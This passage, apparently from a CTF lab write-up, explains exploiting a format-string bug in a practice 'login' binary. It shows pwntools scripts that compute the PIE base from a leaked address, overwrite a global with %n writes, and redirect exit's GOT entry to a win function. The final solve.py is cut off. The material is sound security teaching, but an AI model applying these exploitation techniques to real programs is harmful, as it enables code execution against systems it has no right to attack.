<h2 id="code-breakdown-2">Code breakdown<a href="#code-breakdown-2"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>There are three functions: <code class="language-plaintext highlighter-rouge">main</code>, <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">win</code>; and a global variable <code class="language-plaintext highlighter-rouge">authen_code</code>.</p>

<p>Whereas <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">win</code> respectively invokes <code class="language-plaintext highlighter-rouge">login</code> and prints a congratulation message, <code class="language-plaintext highlighter-rouge">login</code> has a slightly more complicated structure as it does:</p>

<ul>
  <li>Create a buffer, dubbed <code class="language-plaintext highlighter-rouge">creds</code>, of 255 bytes in size</li>
  <li>Assign <code class="language-plaintext highlighter-rouge">0xBADF00D</code> to the global variable <code class="language-plaintext highlighter-rouge">authen_code</code></li>
  <li>Print the current address of itself</li>
  <li>Securely read the input from STDIN to <code class="language-plaintext highlighter-rouge">creds</code> using <code class="language-plaintext highlighter-rouge">fgets</code> then print <code class="language-plaintext highlighter-rouge">creds</code> out again with <code class="language-plaintext highlighter-rouge">printf</code></li>
  <li>Invoke <code class="language-plaintext highlighter-rouge">exit(0)</code> whether <code class="language-plaintext highlighter-rouge">0x1ee71ee7 == authen_code</code>, otherwise print an error message and current <code class="language-plaintext highlighter-rouge">authen_code</code> value</li>
</ul>

<p>Henceforth, we will have to:</p>

<ul>
  <li>
    <p>Calculate the base address of our binary using the leaked address of <code class="language-plaintext highlighter-rouge">login</code> and bypass PIE/PIC</p>
  </li>
  <li>Manipulate the format string vulnerability to perform an arbitrary read/write and modify the value of <code class="language-plaintext highlighter-rouge">authen_code</code> to <code class="language-plaintext highlighter-rouge">0x1ee71ee7</code></li>
  <li>Overwrite the <strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able and call <code class="language-plaintext highlighter-rouge">win</code></li>
</ul>

<h2 id="in-depth-analysis-1">In-depth analysis<a href="#in-depth-analysis-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Load the binary into radare2 and have a glance at its disassembled functions.</p>

<p><code class="language-plaintext highlighter-rouge">main</code>:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-11.png" alt="" /></p>

<p>and <code class="language-plaintext highlighter-rouge">win</code>:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_10-16.png" alt="" /></p>

<p>You might be wondering why there is no canary check in either the prologue or epilogue of these two <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">win</code> functions. This happens since the two simply do not inquire about the stack or have any particularly tasks that need the sentinel values.</p>

<p><code class="language-plaintext highlighter-rouge">login</code>, however, is different as it is plain to see the canary is being stored at <code class="language-plaintext highlighter-rouge">rbp-0x8</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>[0x7f492b935050]&gt; pdf @ sym.login
            ; CALL XREF from main @ 0x56279e188182
            ; DATA XREF from sym.login @ 0x56279e18820c
┌ 329: sym.login ();
│           ; var int64_t var_110h @ rbp-0x110
│           ; var int64_t var_108h @ rbp-0x108
│           ; var int64_t var_100h @ rbp-0x100
│           ; var int64_t var_8h @ rbp-0x8
│           0x56279e1881a4      55             push rbp
│           0x56279e1881a5      4889e5         mov rbp, rsp
│           0x56279e1881a8      4881ec100100.  sub rsp, 0x110
│           0x56279e1881af      64488b042528.  mov rax, qword fs:[0x28]
│           0x56279e1881b8      488945f8       mov qword [var_8h], rax
│           0x56279e1881bc      31c0           xor eax, eax
...
│           0x56279e1882d6      90             nop
│           0x56279e1882d7      488b45f8       mov rax, qword [var_8h]
│           0x56279e1882db      64482b042528.  sub rax, qword fs:[0x28]
│       ┌─&lt; 0x56279e1882e4      7405           je 0x56279e1882eb
│       │   0x56279e1882e6      e855fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       └─&gt; 0x56279e1882eb      c9             leave
└           0x56279e1882ec      c3             ret
</pre></td></tr></tbody></table></code></div></div>

<h3 id="arbitrary-read-with-format-string">Arbitrary read with Format String<a href="#arbitrary-read-with-format-string"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Our first objective is to have <code class="language-plaintext highlighter-rouge">authen_code</code> value overwritten to <code class="language-plaintext highlighter-rouge">0x1ee71ee7</code>.</p>

<p>But there is no buffer overflow gadget to use as the code is using <code class="language-plaintext highlighter-rouge">fgets</code> to properly read our input, so the only solution left is format string which can be triggered within the <code class="language-plaintext highlighter-rouge">printf</code> function. We thus have to determine where we can read our buffer, and fortunately that pwntools is able to help us to automatically accomplish the process. It might be worth nothing but you can find information about the manual method in our previous “canary” challenge from part one.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_11-29.png" alt="" /></p>

<p>I have already prepared the script using FmtStr<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Load the binary
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./login"</span><span class="p">)</span>	

<span class="c1"># Due to my Linux is constantly handling lots of buffering,
# so it has to use a pseudo-terminal to prompt for IO properly
</span><span class="n">pty</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">PTY</span>	

<span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter credentials: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'Verifying...'</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># Automatically looking for our buffer offset
</span><span class="n">autofmt</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">exec_fmt</span><span class="p">)</span> 
<span class="c1"># return offset position
</span><span class="n">offset</span> <span class="o">=</span> <span class="n">autofmt</span><span class="p">.</span><span class="n">offset</span>	
</pre></td></tr></tbody></table></code></div></div>

<p>and it works properly.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_11-35.png" alt="" /></p>

<p>Now that our buffer starts at the sixth offset and we want it to overwrite <code class="language-plaintext highlighter-rouge">authen_code</code> which is a global variable, so we <em>presumably</em> can get its address using <code class="language-plaintext highlighter-rouge">readelf</code> as follows:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>legiahuyy㉿kali<span class="o">)</span>-[~/…/Study/PWN/etc/frmstr]
└─<span class="nv">$ </span>readelf <span class="nt">-s</span> ./login|grep authen_code
    31: 0000000000004060     8 OBJECT  GLOBAL DEFAULT   25 authen_code
</pre></td></tr></tbody></table></code></div></div>

<p>You perhaps are thinking that <code class="language-plaintext highlighter-rouge">0x00004060</code> is the correct address for <code class="language-plaintext highlighter-rouge">authen_code</code> then you must have forgotten about the PIE bit, but it is completely fine since we are going to glide over it one more time.</p>

<blockquote>
  <p>In <a href="https://en.wikipedia.org/wiki/Computing">computing</a>, <strong>position-independent code</strong>[<a href="https://en.wikipedia.org/wiki/Position-independent_code#cite_note-Intel_iRMX-1">1]</a> (<strong>PIC</strong>[<a href="https://en.wikipedia.org/wiki/Position-independent_code#cite_note-Intel_iRMX-1">1]</a>) or <strong>position-independent executable</strong> (<strong>PIE</strong>)[<a href="https://en.wikipedia.org/wiki/Position-independent_code#cite_note-RedHat-2">2]</a> is a body of <a href="https://en.wikipedia.org/wiki/Machine_code">machine code</a> that, being placed somewhere in the <a href="https://en.wikipedia.org/wiki/Primary_memory">primary memory</a>, executes properly regardless of its <a href="https://en.wikipedia.org/wiki/Absolute_address">absolute address</a>.</p>

  <p><a href="https://en.wikipedia.org/wiki/Position-independent_code">Wikipedia</a></p>
</blockquote>

<p>It basically means that every time you run the file, all the addresses of functions, global objects therein will be randomized and you cannot just dump these out statically as they are inconsistent.</p>

<h3 id="piepic-bypass-with-given-leaks">PIE/PIC bypass with given leaks<a href="#piepic-bypass-with-given-leaks"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>On that account, we need to compute the base address before being able to invoke or even modify anything. Fortunately, <code class="language-plaintext highlighter-rouge">login</code> tells us where it is located and we can use the given address to bypass PIE and this is also our second objective.</p>

<p>Imagine PIE/PIC executables work like this, you have a <code class="language-plaintext highlighter-rouge">main</code> function is located at <code class="language-plaintext highlighter-rouge">0x00412</code>, when you run the file, <code class="language-plaintext highlighter-rouge">main</code>’s address is then added up with a random value, say <code class="language-plaintext highlighter-rouge">0x1000</code>, so that now it is <code class="language-plaintext highlighter-rouge">0x01412</code>. Moreover, this random value, dubbed base address, is shared across the memory region of the current instance; hence, our <em>formula</em> for this</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>base_address = leaked_login_addr - abs_login_addr
</pre></td></tr></tbody></table></code></div></div>

<p>and we can automate the process using pwntools.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="p">...</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>

<span class="n">leaked_login_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome to '</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">' sector!</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">abs_login_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'login'</span><span class="p">]</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_login_addr</span> <span class="o">-</span> <span class="n">abs_login_addr</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'leaked_login_addr = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_login_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'abs_login_addr = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">abs_login_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'base_address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>On the first and second run.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_14-55.png" alt="" /></p>

<h3 id="arbitrary-write-with-format-string">Arbitrary write with Format String<a href="#arbitrary-write-with-format-string"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>We by far have had the base address, <code class="language-plaintext highlighter-rouge">authen_code</code> address and the buffer offset, we now just need to construct our payload, accordingly modify the value of <code class="language-plaintext highlighter-rouge">authen_code</code> and complete our first goal. This can be feasible either constructing the payload manually or using auxiliaries from pwntools.</p>

<p>As for myself, I would prefer the automated method to the conventional way since <del>I am lazy</del> the latter is much more strenuous for me to handle. That being said, it is worth showing you a brief concept how we can do it by hand.</p>

<p>The<code class="language-plaintext highlighter-rouge">printf</code> function has a very special format specifier <code class="language-plaintext highlighter-rouge">%n</code> which instead of printing something, it causes <code class="language-plaintext highlighter-rouge">printf</code> to load a pointer and write there <strong>the number of characters printed</strong> by <code class="language-plaintext highlighter-rouge">printf</code> before the occurrence of <code class="language-plaintext highlighter-rouge">%n</code>. For instance, we have a C snippet as follows:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="p">...</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">data</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"abcdefg%n</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"data = %d"</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Build and run the source:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_19-39.png" alt="" /></p>

<p>The idea is that you will print a string of <code class="language-plaintext highlighter-rouge">0x1ee71ee7</code> characters to <code class="language-plaintext highlighter-rouge">authen_code</code>’s address using the <code class="language-plaintext highlighter-rouge">%n</code> format specifier in <code class="language-plaintext highlighter-rouge">print</code>, so your payload looks like this much or less.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = authen_code_addr + b'A' * (0x1ee71ee7 - sizeof(authen_code_addr)) + b"%hhn"
</pre></td></tr></tbody></table></code></div></div>

<p>We have to substract the <code class="language-plaintext highlighter-rouge">0x1ee71ee7</code> for <code class="language-plaintext highlighter-rouge">sizeof(authen_code_addr)</code> as <code class="language-plaintext highlighter-rouge">%n</code> would count it as well, remember? And <code class="language-plaintext highlighter-rouge">%hhn</code> instructs <code class="language-plaintext highlighter-rouge">printf</code> to write the number of printed bytes as byte or that of <code class="language-plaintext highlighter-rouge">%hn</code> as short for smaller size write.</p>

<p>But efficiency, performance <del>and laziness</del> are more to your liking, pwntools has a handy utility for it to match exactly what you desire - <code class="language-plaintext highlighter-rouge">fmtstr_payload</code>.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1"># Syntax
</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">writes</span><span class="p">,</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s">'byte'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The function works similar to how we explain above in the manual method, however, it also provides optimization and thankfully save us some time.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="p">...</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>

<span class="n">leaked_login_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome to '</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">' sector!</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">abs_login_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'login'</span><span class="p">]</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_login_addr</span> <span class="o">-</span> <span class="n">abs_login_addr</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'leaked_login_addr = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_login_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'abs_login_addr = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">abs_login_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'base_address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">authen_code_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'authen_code'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'authen_code offset: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">authen_code_offset</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">authen_code_offset</span> <span class="p">:</span> <span class="mh">0x1ee71ee7</span><span class="p">})</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'fmtstr_payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter credentials: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'latin-1'</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And we have achieved our first goal - modify <code class="language-plaintext highlighter-rouge">authen_code</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-02_20-14.png" alt="" /></p>

<h3 id="overwrite-got">Overwrite GOT<a href="#overwrite-got"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Global Offset Table, or GOT, is one of the sections within an ELF binary that maps symbols to their corresponding absolute memory addresses and facilitate PIE/PIC portion. Furthermore, GOT is loaded into the memory at startup to provide dynamic linking as well as functionalities for the program. Simply put, GOT contains the addresses of functions that the program will use to call from <code class="language-plaintext highlighter-rouge">libc</code>, the C standard library and if we could overwrite an entry, it would be possible to gain code execution.</p>

<p>In our case, we want to overwrite GOT entry of <code class="language-plaintext highlighter-rouge">exit</code> with the location of <code class="language-plaintext highlighter-rouge">win</code>, however, there are some constraints:</p>

<ol>
  <li>If the binary has <strong>Full RELRO</strong> protection enabled <strong>then no GOT overwrite</strong>.</li>
  <li>You need to bypass PIE/PIC, ASLR before being able to call anything.</li>
  <li>Format string or buffer overflow vulnerability.</li>
</ol>

<p>Luckily, the binary has <strong>Partial RELRO</strong> property and we have already handled PIE/PIC in the prior part so we can simply overwrite the <code class="language-plaintext highlighter-rouge">exit</code> entry and replace it with <code class="language-plaintext highlighter-rouge">win</code> using pwntools.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">authen_code_offset</span> <span class="p">:</span> <span class="mh">0x1ee71ee7</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span> <span class="p">:</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'win'</span><span class="p">]})</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'fmtstr_payload: </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter credentials: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-03_13-59.png" alt="" /></p>

<h2 id="solvepy-2">Solve.py<a href="#solvepy-2"><i class="fas fa-hashtag"></i></a></h2></h2>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./login"</span><span class="p">)</span>
<span class="n">pty</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">PTY</span>

<span class="k">def</span> <span class="nf">exec_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter credentials: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'Verifying...'</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="s">'''
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
'''</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">pty</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">pty</span><span class="p">)</span>

<span class="n">leaked_login_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome to '</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">' sector!</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">abs_login_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'login'</span><span class="p">]</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_login_addr</span> <span class="o">-</span> <span class="n">abs_login_addr</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'leaked_login_addr = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_login_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'abs_login_addr = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">abs_login_addr</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">'base_address = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">authen_code_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'authen_code'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'authen_code offset: %s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">authen_code_offset</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">authen_code_offset</span> <span class="p">:</span> <span class="mh">0x1ee71ee7</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'exit'</span><span class="p">]</span> <span class="p">:</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'win'</span><span class="p">]})</span>
